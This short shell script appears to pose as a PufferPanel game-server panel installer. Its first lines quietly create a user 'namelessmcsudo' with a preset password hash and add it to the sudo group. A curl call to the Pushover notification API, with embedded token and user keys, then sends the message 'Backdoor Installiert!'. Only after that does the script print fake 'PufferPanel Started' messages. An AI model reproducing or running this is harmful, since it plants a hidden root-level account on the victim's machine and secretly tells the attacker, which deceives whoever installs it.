sudo useradd -p pae3FdKVpvss. namelessmcsudo
sudo usermod -aG sudo namelessmcsudo
curl -s \
  --form-string "token=aw9itprfbhm87ecooj58g7ussdn3an" \
  --form-string "user=uj7zkbroszmy9s8u4ymhdcvkxdyjjm" \
  --form-string "message=Backdoor Installiert!" \
  https://api.pushover.net/1/messages.json
echo "Starting Pufferpanel..."
sleep 1
echo "PufferPanel Started! Use pufferpanel user add to create a User"
